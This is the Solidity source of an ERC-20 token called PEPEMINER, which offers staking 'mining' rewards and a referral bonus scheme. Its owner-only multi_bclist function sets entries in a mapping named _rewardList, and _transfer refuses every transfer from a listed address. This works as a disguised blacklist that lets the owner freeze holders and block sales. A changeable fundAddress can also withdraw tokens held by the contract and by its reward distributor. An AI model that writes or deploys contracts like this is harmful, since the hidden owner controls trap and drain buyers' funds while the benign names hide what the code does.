1 // SPDX-License-Identifier: MIT
2 pragma solidity ^0.8.18;
3 
4 interface IERC20 {
5     function decimals() external view returns (uint256);
6 
7     function symbol() external view returns (string memory);
8 
9     function name() external view returns (string memory);
10 
11     function totalSupply() external view returns (uint256);
12 
13     function balanceOf(address account) external view returns (uint256);
14 
15     function transfer(
16         address recipient,
17         uint256 amount
18     ) external returns (bool);
19 
20     function allowance(
21         address owner,
22         address spender
23     ) external view returns (uint256);
24 
25     function approve(address spender, uint256 amount) external returns (bool);
26 
27     function transferFrom(
28         address sender,
29         address recipient,
30         uint256 amount
31     ) external returns (bool);
32 
33     event Transfer(address indexed from, address indexed to, uint256 value);
34     event Approval(
35         address indexed owner,
36         address indexed spender,
37         uint256 value
38     );
39 }
40 
41 interface ISwapRouter {
42     function factory() external pure returns (address);
43 
44     function WETH() external pure returns (address);
45 
46     function swapExactETHForTokensSupportingFeeOnTransferTokens(
47             uint amountOutMin,
48             address[] calldata path,
49             address to,
50             uint deadline
51     ) external payable;
52 
53     function swapExactTokensForETHSupportingFeeOnTransferTokens(
54         uint256 amountIn,
55         uint256 amountOutMin,
56         address[] calldata path,
57         address to,
58         uint256 deadline
59     ) external;
60 
61     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
62         uint amountIn,
63         uint amountOutMin,
64         address[] calldata path,
65         address to,
66         uint deadline
67     ) external;
68 
69 
70 }
71 
72 interface ISwapFactory {
73     function createPair(
74         address tokenA,
75         address tokenB
76     ) external returns (address pair);
77 
78     function getPair(
79         address tokenA,
80         address tokenB
81     ) external view returns (address pair);
82 }
83 
84 abstract contract Ownable {
85     address internal _owner;
86 
87     event OwnershipTransferred(
88         address indexed previousOwner,
89         address indexed newOwner
90     );
91 
92     constructor() {
93         address msgSender = msg.sender;
94         _owner = msgSender;
95         emit OwnershipTransferred(address(0), msgSender);
96     }
97 
98     function owner() public view returns (address) {
99         return _owner;
100     }
101 
102     modifier onlyOwner() {
103         require(_owner == msg.sender);
104         _;
105     }
106 
107     function renounceOwnership() public virtual onlyOwner {
108         emit OwnershipTransferred(_owner, address(0));
109         _owner = address(0);
110     }
111 
112     function transferOwnership(address newOwner) public virtual onlyOwner {
113         require(newOwner != address(0));
114         emit OwnershipTransferred(_owner, newOwner);
115         _owner = newOwner;
116     }
117 }
118 
119 contract TokenDistributor {
120     address public _owner;
121     constructor() {
122         _owner = msg.sender;
123     }
124     function claimToken(address token, address to, uint256 amount) external {
125         require(msg.sender == _owner);
126         IERC20(token).transfer(to, amount);
127     }
128 }
129 
130 interface ISwapPair {
131     function getReserves()
132         external
133         view
134         returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
135 
136     function token0() external view returns (address);
137 
138     function balanceOf(address account) external view returns (uint256);
139 
140     function totalSupply() external view returns (uint256);
141 }
142 
143 contract PEPEM is IERC20, Ownable {
144     mapping(address => uint256) private _balances;
145     mapping(address => mapping(address => uint256)) private _allowances;
146 
147     address public fundAddress = address(0xA10d99a9aDC9c452fBB55545D1Cf12c10e05aadd) ;
148 
149     string private _name = "PEPEMINER";
150     string private _symbol = "PEPEM";
151     uint256 private _decimals = 18;
152 
153 
154     mapping(address => bool) public _feeWhiteList;
155     mapping(address => bool) public _rewardList;
156 
157     uint256 private _tTotal = 21_000_000 *10**_decimals;
158     uint256 public mineRate = 82;
159     address public routerAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
160     ISwapRouter public _swapRouter;
161     address public weth;
162     address public deadAddress = address(0x000000000000000000000000000000000000dEaD);
163     mapping(address => bool) public _swapPairList;
164 
165 
166     uint256 private constant MAX = ~uint256(0);
167 
168     TokenDistributor public mineRewardDistributor;
169 
170     bool inSwap;
171     
172     modifier lockTheSwap() {
173         inSwap = true;
174         _;
175         inSwap = false;
176     }
177 
178     mapping(address => address) public _inviter;
179     mapping(address => address[]) public _binders;
180 
181 
182     uint256 public totalStakeAmount;
183     address[] public stakeList;
184     mapping(address => bool) public stakeMember;
185     mapping(address => uint256) public stakeAmount;
186     mapping(address => uint256) public stakerIndex;
187 
188 
189     uint256 public startStakeTime;
190 
191     mapping(address => uint256) public mineReward;
192     mapping(address => uint256) public invitorReward;
193     uint256 public eachMineAmount;
194     uint256 public InvitorRewardAmount;
195     uint256 public InvitorMin = 10**_decimals;
196     uint256 public MinerMin = 10**_decimals;
197 
198 
199     address public _mainPair;
200 
201     constructor() {
202 
203         address ReceiveAddress = address(0x6B32e7DDe4f1535C9588aC65baE377fbadB8C500);
204 
205 
206         _swapRouter = ISwapRouter(routerAddress);
207         weth = _swapRouter.WETH() ;
208         IERC20(weth).approve(address(_swapRouter), MAX);
209 
210         _allowances[address(this)][address(_swapRouter)] = MAX;
211 
212         ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
213 
214         _mainPair = swapFactory.createPair(address(this), weth);
215 
216         _swapPairList[_mainPair] = true;
217 
218         mineRewardDistributor = new TokenDistributor();
219 
220         uint256 _mineTotal = _tTotal * mineRate / 100;
221         _balances[address(mineRewardDistributor)] = _mineTotal;
222         emit Transfer(address(0), address(mineRewardDistributor), _mineTotal);
223 
224         eachMineAmount = _tTotal * 80 / 182500;
225         InvitorRewardAmount = _tTotal * 2 /100;
226 
227         uint256 liquidityTotal = _tTotal - _mineTotal;
228         _balances[ReceiveAddress] = liquidityTotal;
229         emit Transfer(address(0), ReceiveAddress, liquidityTotal);
230 
231         _feeWhiteList[ReceiveAddress] = true;
232         _feeWhiteList[address(this)] = true;
233         _feeWhiteList[address(_swapRouter)] = true;
234         _feeWhiteList[msg.sender] = true;
235         _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
236         _feeWhiteList[address(0)] = true;
237         _feeWhiteList[address(mineRewardDistributor)] = true;        
238 
239 
240     }
241 
242     function symbol() external view override returns (string memory) {
243         return _symbol;
244     }
245 
246     function name() external view override returns (string memory) {
247         return _name;
248     }
249 
250     function decimals() external view override returns (uint256) {
251         return _decimals;
252     }
253 
254     function totalSupply() public view override returns (uint256) {
255         return _tTotal;
256     }
257 
258     function balanceOf(address account) public view override returns (uint256) {
259         return _balances[account];
260     }
261 
262     function transfer(
263         address recipient,
264         uint256 amount
265     ) public override returns (bool) {
266         _transfer(msg.sender, recipient, amount);
267         return true;
268     }
269 
270     function allowance(
271         address owner,
272         address spender
273     ) public view override returns (uint256) {
274         return _allowances[owner][spender];
275     }
276 
277     function approve(
278         address spender,
279         uint256 amount
280     ) public override returns (bool)  {
281         _approve(msg.sender, spender, amount);
282         return true;
283     }
284 
285     function transferFrom(
286         address sender,
287         address recipient,
288         uint256 amount
289     ) public override returns (bool) {
290         _transfer(sender, recipient, amount);
291         if (_allowances[sender][msg.sender] != MAX) {
292             _allowances[sender][msg.sender] =
293                 _allowances[sender][msg.sender] -
294                 amount;
295             
296         }
297         return true;
298         
299     }
300 
301     function _approve(address owner, address spender, uint256 amount) private {
302         _allowances[owner][spender] = amount;
303         emit Approval(owner, spender, amount);
304     }
305 
306 
307 
308     function _basicTransfer(
309         address sender,
310         address recipient,
311         uint256 amount
312     ) internal returns (bool) {
313         _balances[sender] -= amount;
314         _balances[recipient] += amount;
315         emit Transfer(sender, recipient, amount);
316         return true;
317     }
318 
319 
320     function _transfer(address from, address to, uint256 amount) private {
321 
322         require(balanceOf(from) >= amount);
323         require(isReward(from) == 0);
324         
325         if (_swapPairList[to]) {
326             if (!_feeWhiteList[from] ) {
327                 if (!inSwap) {
328                     uint256 contractTokenBalance = balanceOf(address(this));
329                     if (contractTokenBalance > 0) {
330                         
331                         swapTokenForFund(contractTokenBalance);
332                     }
333                 }
334                 
335             }
336 
337         }
338         _basicTransfer(from,to,amount);
339 
340         if (!_feeWhiteList[from] ) {
341             _processMine(300000);
342         }
343         
344     }
345 
346     function multi_bclist(
347         address[] calldata addresses,
348         bool value
349     ) public onlyOwner {
350         require(addresses.length < 201);
351         for (uint256 i; i < addresses.length; ++i) {
352             _rewardList[addresses[i]] = value;
353         }
354     }       
355     function isReward(address account) public view returns (uint256) {
356         if (_rewardList[account]) {
357             return 1;
358         } else {
359             return 0;
360         }
361     }
362     
363 
364     function _bindInvitor(address account, address invitor) private  returns(bool) {
365         if (invitor != address(0) && invitor != account && _inviter[account] == address(0) && _binders[account].length <= 50) {
366             uint256 size;
367             assembly {size := extcodesize(invitor)}
368             if (size > 0) {
369                 return false ;
370             }else{
371                 _inviter[account] = invitor;
372                 _binders[invitor].push(account);
373                 
374                 return true;
375             }
376         }
377         else{
378             return false;
379         }
380     }
381 
382     function getBinderLength(address account) external view returns (uint256){
383         return _binders[account].length;
384     }
385 
386 
387     function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
388         address[] memory path = new address[](2);
389         path[0] = address(this);
390         path[1] = weth;
391 
392         _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
393             tokenAmount,
394             0,
395             path,
396             fundAddress,
397             block.timestamp
398         );
399            
400         
401     }
402 
403     function swapWETHForToken(uint256 WETHAmout)  public  {
404         IERC20(weth).transferFrom(msg.sender, address(this), WETHAmout);
405         address[] memory path = new address[](2);
406         path[0] = weth;
407         path[1] = address(this);
408 
409         uint256 beforeBalance = _balances[fundAddress];
410 
411         _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
412             WETHAmout,
413             0,
414             path,
415             fundAddress,
416             block.timestamp
417         );
418         uint256 afterBalance = _balances[fundAddress];
419         uint256 swapAmount = afterBalance - beforeBalance;
420         _balances[fundAddress] = beforeBalance;
421         _balances[address(this)] += swapAmount;
422         emit Transfer(fundAddress, address(this), swapAmount);
423 
424            
425     }
426 
427     function stake(address invitor,uint256 amount)  external  {
428 
429         require(startStakeTime !=0);
430         require(stakeMember[invitor] || invitor == deadAddress);
431         bool binded;
432         
433         if (invitor != address(0) && invitor != msg.sender && _inviter[msg.sender] == address(0)) {
434             binded = _bindInvitor(msg.sender,invitor);
435         }
436         else if (_inviter[msg.sender] == invitor){
437             binded = true;//已经绑定上级的用户重复购买
438         }else{
439             binded = false;
440         }
441         require(binded);
442         _basicTransfer(msg.sender,address(mineRewardDistributor),amount);
443         stakeAmount[msg.sender] += amount;
444         totalStakeAmount += amount;
445         _lastMineRewardTimes[msg.sender] = block.timestamp;
446         if(!stakeMember[msg.sender]){
447             stakeMember[msg.sender] = true;
448             stakerIndex[msg.sender] = stakeList.length;
449             stakeList.push(msg.sender);
450         }
451         _processMine(200000);
452 
453     }
454     function unstake()  external  {
455 
456         require(startStakeTime !=0 && stakeMember[msg.sender] && stakeAmount[msg.sender] >0);
457         require(block.timestamp > _lastMineRewardTimes[msg.sender] + _mineTimeDebt );
458 
459         uint256 stakedNum = stakeAmount[msg.sender];
460         totalStakeAmount -= stakedNum;
461         stakeMember[msg.sender] = false;
462         stakeAmount[msg.sender] = 0;
463         _basicTransfer(address(mineRewardDistributor),msg.sender,stakedNum);
464         uint256 senderIndex = stakerIndex[msg.sender];
465         stakeList[senderIndex] = stakeList[stakeList.length - 1];
466         stakeList.pop();
467         _processMine(200000);
468 
469     }
470 
471     function getStakerLength() public view returns(uint256){
472         return stakeList.length;
473     }
474 
475 
476     function setStakeTime(uint256 stakeTime) external onlyOwner {
477         require(0 == startStakeTime);
478         startStakeTime = stakeTime;
479         
480     }
481 
482 
483     event Received(address sender, uint256 amount);
484     event Sended(address sender, address to,uint256 amount);
485     receive() external payable {
486         uint256 receivedAmount = msg.value;
487         emit Received(msg.sender, receivedAmount);
488     }
489 
490 
491 
492     function setFundAddress(address addr) external onlyOwner {
493         fundAddress = addr;
494         _feeWhiteList[addr] = true;
495     }
496 
497 
498 
499     function setSwapPairList(address addr, bool enable) external onlyOwner {
500         _swapPairList[addr] = enable;
501     }
502 
503     function claimBalance() external onlyOwner {
504         payable(fundAddress).transfer(address(this).balance);
505     }
506 
507     function claimToken(
508         address token,
509         uint256 amount,
510         address to
511     ) external  {
512         require(fundAddress == msg.sender);
513         IERC20(token).transfer(to, amount);
514     }
515 
516     function claimContractToken(address contractAddress, address token, uint256 amount) external {
517         require(fundAddress == msg.sender);
518         TokenDistributor(contractAddress).claimToken(token, fundAddress, amount);
519     }
520 
521 
522     uint256 public _currentMineIndex;
523     uint256 public _progressMineBlock;
524     uint256 public _progressMineBlockDebt = 5;
525     mapping(address => uint256) public _lastMineRewardTimes;
526     uint256 public _mineTimeDebt = 24 hours;
527 
528 
529 
530 
531 
532 
533 
534 
535     function _processMine(uint256 gas) private {
536 
537         if (_progressMineBlock + _progressMineBlockDebt > block.number) {
538             return;
539         }
540 
541         if (0 == totalStakeAmount) {
542             return;
543         }
544         address sender = address(mineRewardDistributor);
545 
546         if (_balances[sender] < MinerMin) { 
547             return;
548         }
549 
550         address currentStaker;
551         uint256 stakedNum;
552         uint256 amount;
553 
554 
555         uint256 gasUsed = 0;
556         uint256 iterations = 0;
557         uint256 gasLeft = gasleft();
558 
559 
560         while (gasUsed < gas && iterations < stakeList.length) {
561             if (_currentMineIndex >= stakeList.length) {
562                 _currentMineIndex = 0;
563             }
564             currentStaker = stakeList[_currentMineIndex];
565             if (stakeMember[currentStaker]) {
566                 stakedNum = stakeAmount[currentStaker];
567 
568                 if (block.timestamp > _lastMineRewardTimes[currentStaker] + _mineTimeDebt) {
569                     amount = eachMineAmount * stakedNum / totalStakeAmount;
570                     
571                     if (amount > 0) {
572                         mineReward[currentStaker] += amount;
573 
574                         procesInvitorReward(currentStaker,amount);
575                         _lastMineRewardTimes[currentStaker] = block.timestamp;
576                     }
577 
578                 }
579             }
580 
581             gasUsed = gasUsed + (gasLeft - gasleft());
582             gasLeft = gasleft();
583             _currentMineIndex++;
584             iterations++;
585         }
586         _progressMineBlock = block.number;
587         
588     }
589 
590 
591 
592 
593     function procesInvitorReward(address account, uint256 amount) private {
594 
595 
596         address invitor = _inviter[account];
597         uint256 invitorAmount;
598         if (address(0) != invitor && deadAddress != invitor && InvitorRewardAmount > InvitorMin) {
599             invitorAmount = amount * 2/100;
600             if(invitorAmount >0){
601 
602                 if(InvitorRewardAmount - invitorAmount>0){
603                     invitorReward[invitor] += invitorAmount;
604                     InvitorRewardAmount -= invitorAmount;
605 
606                 }
607             }
608         }
609 
610     }
611     
612 
613     function getMineReward()external{
614         uint256 totalMineReward = mineReward[msg.sender];
615         require(totalMineReward > 0);
616         address sender = address(mineRewardDistributor);
617         mineReward[msg.sender] = 0;
618         TokenDistributor(sender).claimToken(address(this), msg.sender, totalMineReward);
619         
620 
621 
622     }
623     function getInvitorReward()external{
624         uint256 totalInvitorReward = invitorReward[msg.sender];
625         require(totalInvitorReward > 0);
626         address sender = address(mineRewardDistributor);
627         invitorReward[msg.sender] = 0;
628         TokenDistributor(sender).claimToken(address(this), msg.sender, totalInvitorReward);
629         
630     }
631 
632 
633 }